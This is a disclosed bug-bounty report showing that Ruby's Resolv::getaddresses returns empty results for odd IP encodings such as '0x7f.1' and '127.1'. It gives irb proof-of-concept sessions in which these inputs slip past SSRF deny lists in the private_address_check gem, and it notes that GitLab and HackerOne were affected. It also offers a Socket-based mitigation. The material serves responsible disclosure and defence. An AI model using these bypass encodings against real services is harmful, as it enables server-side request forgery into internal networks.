# Resolv::getaddresses bug that can be abused to bypass security measures. 

## Report Details
- **Report ID**: 287835
- **URL**: https://hackerone.com/reports/287835
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-11-06T19:44:58.500Z
- **Disclosed**: 2018-02-23T07:19:19.776Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
# Description

`Resolv::getaddresses` is OS-dependent, therefore by playing around with different IP formats one can return blank values. This bug can be abused to bypass exclusion lists often used to protect against SSRF.

| 💻 Machine 1 | 	💻 Machine 2 | 
|--------------|---------------| 
| ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu] | ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu] |

💻 Machine 1

```
irb(main):002:0> Resolv.getaddresses("127.0.0.1")
=> ["127.0.0.1"]
irb(main):003:0> Resolv.getaddresses("localhost")
=> ["127.0.0.1"]
irb(main):004:0> Resolv.getaddresses("127.000.000.1")
=> ["127.0.0.1"]
```
💻 Machine 2

```
irb(main):008:0> Resolv.getaddresses("127.0.0.1")
=> ["127.0.0.1"]
irb(main):009:0> Resolv.getaddresses("localhost")
=> ["127.0.0.1"]
irb(main):010:0> Resolv.getaddresses("127.000.000.1")
=> []
```

# Proof of concept

```
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> server_ips = Resolv.getaddresses(uri)
=> [] # The bug!
irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0> (blocked_ips & server_ips).any?
=> false # Bypass
```

# Mitigation

Currently I have been suggesting that the affected vendors stay away from `Resolv::getaddresses` altogether and use the `Socket` class.

```
irb(main):002:0> Resolv.getaddresses("127.1")
=> []
irb(main):003:0> Socket.getaddrinfo("127.1", nil).sample[3]
=> "127.0.0.1"
```

# Affected vendors and gems

By abusing this bug I was able to bypass GitLab, HackerOne and [private_address_check](https://github.com/jtdowney/private_address_check/)'s [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery) filters.

The `private_address_check` gem, for instance, relied on `Resolv::getaddresses` in `lib/private_address_check.rb`:

```ruby
def resolves_to_private_address?(hostname)
    ips = Resolv.getaddresses(hostname)
    ips.any? do |ip| 
      private_address?(ip)
    end
end
```

```
irb(main):001:0> require 'private_address_check'
=> true
irb(main):002:0> PrivateAddressCheck.resolves_to_private_address?("127.1")
=> false # Bypass
```

The author of this gem has provided a [patch](https://github.com/jtdowney/private_address_check/commit/58a0d7fe31de339c0117160567a5b33ad82b46af) for this issue and I can confirm that I am unable to bypass the fix.

GitLab and HackerOne have also been notified and plan on releasing a fix this week.



## Attachments
No attachments
